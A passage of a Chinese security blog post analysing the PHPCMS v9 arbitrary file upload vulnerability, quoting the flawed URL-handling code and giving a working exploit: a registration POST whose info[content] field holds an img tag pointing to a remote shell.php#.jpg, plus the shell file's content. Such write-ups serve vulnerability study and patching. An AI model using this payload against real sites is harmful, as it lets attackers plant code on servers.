class="number">2</span>,strlen($surl)<span class="number">-2</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$urls = explode(<span class="string">'/'</span>,$surl);</span><br><span class="line">			<span class="keyword">foreach</span>($urls <span class="keyword">as</span> $u) &#123;</span><br><span class="line">				<span class="keyword">if</span>($u==<span class="string">".."</span>) $pathStep++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>($i&lt;count($urls)<span class="number">-1</span>) $dstr .= $urls[$i].<span class="string">'/'</span>;</span><br><span class="line">				<span class="keyword">else</span> $dstr .= $urls[$i];</span><br><span class="line">				$i++;</span><br><span class="line">			&#125;</span><br><span class="line">			$urls = explode(<span class="string">'/'</span>, $BaseUrlPath);</span><br><span class="line">			<span class="keyword">if</span>(count($urls) &lt;= $pathStep)</span><br><span class="line">			<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				$pstr = <span class="string">'http://'</span>;</span><br><span class="line">				<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($urls)-$pathStep;$i++) &#123;</span><br><span class="line">					$pstr .= $urls[$i].<span class="string">'/'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$okurl = $pstr.$dstr;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">		<span class="keyword">if</span>(strlen($surl)&lt;<span class="number">7</span>)</span><br><span class="line">		$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">		<span class="keyword">elseif</span>($preurl==<span class="string">"http:/"</span>||$preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">"rtsp://"</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule:'</span>|| $preurl==<span class="string">'ed2k:/'</span>)</span><br><span class="line">		$okurl = $surl;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">	&#125;</span><br><span class="line">	$preurl = strtolower(substr($okurl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">	<span class="keyword">if</span>($preurl==<span class="string">'ftp://'</span> || $preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">'rtsp://'</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule:'</span>|| $preurl==<span class="string">'ed2k:/'</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> $okurl;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$okurl = preg_replace(<span class="string">'/^(http:\/\/)/i'</span>,<span class="string">''</span>,$okurl);</span><br><span class="line">		$okurl = preg_replace(<span class="string">'/\/&#123;1,&#125;/i'</span>,<span class="string">'/'</span>,$okurl);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'http://'</span>.$okurl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数中的关键代码在于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure>
+
+<p>这个他会将矛点以后内容就删掉了．如果构造的payload长这样<code>http://vps/shell.php#.jpg</code></p>
+<p>那么就能构造出一个带有shell的url</p>
+<p>然后继续看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($upload_func($file, $newfile))</span><br></pre></td></tr></table></figure>
+
+<p><code>$upload_func</code>实际上就是调用了<code>copy()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;upload_func = <span class="string">'copy'</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>$file</code>就是我们的上传文件url．然后<code>$newfile</code>就是文件保存路径．</p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=member&amp;c=index&amp;a=register&amp;siteid=1</span><br><span class="line">POST:siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://127.0.0.1/shell.php#.jpg</span>&gt;</span>&amp;dosubmit=1</span><br></pre></td></tr></table></figure>
+
+<p>然后shell.php的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;?php  phpinfo(); ?&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后文件路径.由于</p>
+<p><img src="/.com//cookie/blog/source/_posts/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="1581353481111"></p>
+<p>这里的插入数据库操作，由于payload中的<code>content</code>字段数据库中并没有，所以会报错</p>
+<p><img src="/.com//cookie/blog/source/_posts/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%EF%BC%92.png" alt="1581353686001"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>希望自己在进步，冲！！！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/10/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5k40016kou55vlmdoa3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/14/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          phpcmsv9任意文件下载漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/10/hackNos-ReconForce-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">hackNos-ReconForce-vulnhub渗透测试</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
